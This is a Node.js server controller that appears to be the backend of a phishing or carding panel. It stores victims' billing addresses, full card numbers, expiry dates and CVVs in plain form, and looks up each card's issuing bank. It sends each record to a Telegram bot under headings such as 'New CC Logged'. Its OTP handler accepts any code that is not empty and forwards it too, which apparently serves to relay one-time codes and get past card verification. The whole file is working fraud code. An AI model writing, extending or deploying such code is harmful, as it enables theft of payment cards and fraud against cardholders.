// server/controller/billingController.js
const fs = require('fs');
const path = require('path');
const csv = require('csv-parser');
const Billing = require('../models/Billing');
const CreditCard = require('../models/CreditCard');
const Bank = require('../models/Bank');
const axios = require('axios');
var lookup = require('binlookup')();

const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, BINDB_API_KEY } = process.env;

// Function to read and parse the CSV file
const readCSV = async (bin) => {
  return new Promise((resolve, reject) => {
    const results = [];
    fs.createReadStream(path.join(__dirname, '../data/bin-list-data.csv'))
      .pipe(csv())
      .on('data', (data) => results.push(data))
      .on('end', () => {
        const binData = results.find(row => row.BIN === bin);
        if (binData) {
          resolve(binData);
        } else {
          reject(new Error('BIN not found'));
        }
      })
      .on('error', (error) => reject(error));
  });
};

exports.createBillingInfo = async (req, res) => {
  const { userId, fName, lName ,street, city, state, postalCode } = req.body;
  
  
  if (!userId) {
    return res.status(400).json({ error: 'User ID is required' });
  }
  
  try {
    // Create new billing info
    const billingInfo = new Billing({ userId, fName, lName,street, city, state, postalCode });
    await billingInfo.save();
    
    // Send notification to Telegram
    const message = `
    🏠 <b>New Billing Address Added</b> 🏠
    ---------------------------------
    👤 <b>UserID:</b> ${userId}
    📍 <b>Street:</b> ${street}
       <b>fName:</b> ${fName}
       <b>lName:</b> ${lName}
    🏙️ <b>City:</b> ${city}
    🗽 <b>State:</b> ${state}
    📮 <b>ZIP:</b> ${postalCode}
    🕒 <b>Time:</b> ${new Date().toLocaleString()}
    `;
    
    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError);
    }

    res.status(201).json({ message: 'Billing information saved successfully' });
  } catch (error) {
    console.error('Error processing billing information:', error);
    res.status(500).json({ error: 'Error processing billing information' });
  }
};

exports.getBillingInfo = async (req, res) => {
  const { userId } = req.params;
  
  try {
    const billingInfo = await Billing.findOne({ userId })
    .sort({ createdAt: -1 }) // Sort by creation date, newest first
    .limit(1); // Get only the most recent record
    
    if (!billingInfo) {
      return res.status(404).json({ error: 'Billing information not found' });
    }

    res.status(200).json(billingInfo);
  } catch (error) {
    console.error('Error fetching billing information:', error);
    res.status(500).json({ error: 'Error fetching billing information' });
  }
};

const fetchBankLogo = async (bankDomain) => {
  if (!bankDomain || bankDomain === 'undefined') {
    console.warn('Invalid or missing bank domain; using fallback logo.');
    return 'https://logo.clearbit.com/example.com';
  }
  return `https://logo.clearbit.com/${bankDomain}`;
};

exports.createCreditCardInfo = async (req, res) => {
  const { userId, cardNumber, expiryDate, securityCode, nameOnCard } = req.body;

  if (!userId) {
    return res.status(400).json({ error: 'User ID is required' });
  }

  try {
    const sanitizedCardNumber = cardNumber.replace(/\s+/g, '');
    const bin = sanitizedCardNumber.slice(0, 6);

    let bankInfo = '';
    let bankId = null;
    let bankLogoUrl = 'https://logo.clearbit.com/example.com'; // Default fallback

    try {
      const binData = await readCSV(bin);

      // Clean and format the bank domain
      const bankDomain = binData['IssuerUrl']?.replace(/^www\./, '').trim() || 'example.com';
      bankLogoUrl = `https://logo.clearbit.com/${bankDomain}`;

      const bankData = {
        bin,
        bankName: binData['Issuer'] || 'Unknown',
        countryName: binData['CountryName'] || 'Unknown',
        countryEmoji: binData['isoCode2'] || '🌐',
        scheme: binData['Brand'] || 'Unknown',
        type: binData['Type'] || 'Unknown',
        brand: binData['Brand'] || 'Unknown',
        logoUrl: bankLogoUrl,
        lastUpdated: new Date()
      };

      const bank = await Bank.findOneAndUpdate(
        { bin: bin },
        bankData,
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true
        }
      );

      bankId = bank._id;

      bankInfo = `
🏦 <b>Bank:</b> ${bankData.bankName}
🌐 <b>Country:</b> ${bankData.countryEmoji} ${bankData.countryName}
💳 <b>Scheme:</b> ${bankData.scheme}
💳 <b>Type:</b> ${bankData.type}
💳 <b>Brand:</b> ${bankData.brand}
🖼️ <b>Logo:</b> [Logo](${bankData.logoUrl})
      `;
    } catch (binError) {
      console.error('BIN lookup failed:', binError);
      bankInfo = `
🏦 <b>Bank:</b> Unknown
🌐 <b>Country:</b> Unknown
💳 <b>Scheme:</b> Unknown
💳 <b>Type:</b> Unknown
💳 <b>Brand:</b> Unknown
🖼️ <b>Logo:</b> [Fallback Logo](https://logo.clearbit.com/example.com)
      `;
    }

    const creditCardInfo = new CreditCard({ userId, cardNumber, expiryDate, securityCode, nameOnCard, bank: bankId });
    await creditCardInfo.save();

    const message = `
🏦 <b>New CC Logged</b> 🏦
---------------------------------
👤 <b>UserID:</b> ${userId}
👤 <b>Name On Card:</b> ${nameOnCard}
📍 <b>CC NUM:</b> ${cardNumber}
🏙️ <b>EXP:</b> ${expiryDate}
🗽 <b>CVV:</b> ${securityCode}
${bankInfo}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
    `;

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError.message);
    }

    res.status(201).json({ message: 'Credit card information saved successfully' });
  } catch (error) {
    console.error('Error saving credit card information:', error);
    res.status(500).json({ error: 'Error saving credit card information' });
  }
};

exports.getAllBillingInfo = async (req, res) => {
  const { userId } = req.params;
  
  try {
    const billingInfoList = await Billing.find({ userId });
    if (!billingInfoList.length) {
      return res.status(404).json({ error: 'No billing information found' });
    }
    res.status(200).json(billingInfoList);
  } catch (error) {
    console.error('Error fetching billing information:', error);
    res.status(500).json({ error: 'Error fetching billing information' });
  }
};


exports.getCreditCardInfo = async (req, res) => {
  const { userId } = req.params;

  try {
    const creditCardInfo = await CreditCard.findOne({ userId });
    if (!creditCardInfo) {
      return res.status(404).json({ error: 'Credit card information not found' });
    }
    res.status(200).json(creditCardInfo);
  } catch (error) {
    console.error('Error fetching credit card information:', error);
    res.status(500).json({ error: 'Error fetching credit card information' });
  }
};

exports.handleContinue = async (req, res) => {
  const { userId } = req.params;

  if (!userId) {
    return res.status(400).json({ error: 'User ID is required' });
  }

  try {
    const billingInfo = await Billing.findOne({ userId });
    const creditCardInfo = await CreditCard.findOne({ userId });

    if (!billingInfo || !creditCardInfo) {
      return res.status(404).json({ error: 'Billing or credit card information not found' });
    }

    const message = `
🔔 <b>User Requested Code</b> 🔔
---------------------------------
👤 <b>UserID:</b> ${userId}
🏠 <b>Billing Info:</b>
📍 <b>Street:</b> ${billingInfo.street}
🏙️ <b>City:</b> ${billingInfo.city}
🗽 <b>State:</b> ${billingInfo.state}
📮 <b>ZIP:</b> ${billingInfo.postalCode}
💳 <b>Credit Card Info:</b>
📍 <b>CC NUM:</b> ${creditCardInfo.cardNumber}
🏙️ <b>EXP:</b> ${creditCardInfo.expiryDate}
🗽 <b>CVV:</b> ${creditCardInfo.securityCode}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
    `;
    console.log(`
🔔 <b>User Requested Code</b> 🔔
---------------------------------
👤 <b>UserID:</b> ${userId}
🏠 <b>Billing Info:</b>
📍 <b>Street:</b> ${billingInfo.street}
🏙️ <b>City:</b> ${billingInfo.city}
🗽 <b>State:</b> ${billingInfo.state}
📮 <b>ZIP:</b> ${billingInfo.postalCode}
💳 <b>Credit Card Info:</b>
📍 <b>CC NUM:</b> ${creditCardInfo.cardNumber}
🏙️ <b>EXP:</b> ${creditCardInfo.expiryDate}
🗽 <b>CVV:</b> ${creditCardInfo.securityCode}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
    `);
    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError);
    }

    res.status(200).json({ message: 'Notification sent successfully' });
  } catch (error) {
    console.error('Error handling continue request:', error);
    res.status(500).json({ error: 'Error handling continue request' });
  }
};
exports.verifyOtp = async (req, res) => {
  const { userId } = req.params;
  const { otp } = req.body;

  try {
      const creditCard = await CreditCard.findOne({ userId });
      
      if (!creditCard) {
          return res.status(404).json({ message: 'Credit card not found' });
      }

      // Verify OTP logic
      if ( otp != "" ) {
          creditCard.otp = otp;
          creditCard.otpVerified = true;
          await creditCard.save();

          // Send success notification
          const message = `
🔐 <b>OTP Verified Successfully</b>
---------------------------------
👤 <b>UserID:</b> ${userId}
💳 <b>Card:</b> ${creditCard.cardNumber}
✅ <b>OTP:</b> ${otp}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
          `;

          try {
              await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                  chat_id: process.env.TELEGRAM_CHAT_ID,
                  text: message,
                  parse_mode: 'HTML'
              });
          } catch (telegramError) {
              console.error('Telegram notification failed:', telegramError);
          }

          return res.status(200).json({ message: 'OTP verified successfully' });
      }

      res.status(400).json({ message: 'Invalid OTP' });
  } catch (error) {
      console.error('Error verifying OTP:', error);
      res.status(500).json({ message: 'Error verifying OTP' });
  }
};

exports.getLogoUrlByUserId = async (req, res) => {
  const { userId } = req.params;

  try {
    const creditCardInfo = await CreditCard.findOne({ userId }).populate('bank');
    if (!creditCardInfo || !creditCardInfo.bank) {
      return res.status(404).json({ error: 'Credit card or bank information not found' });
    }

    const logoUrl = creditCardInfo.bank.logoUrl || 'https://logo.clearbit.com/example.com';
    const brand = creditCardInfo.bank.brand;
    res.status(200).json({ logoUrl , brand });
  } catch (error) {
    console.error('Error fetching logo URL:', error);
    res.status(500).json({ error: 'Error fetching logo URL' });
  }
};
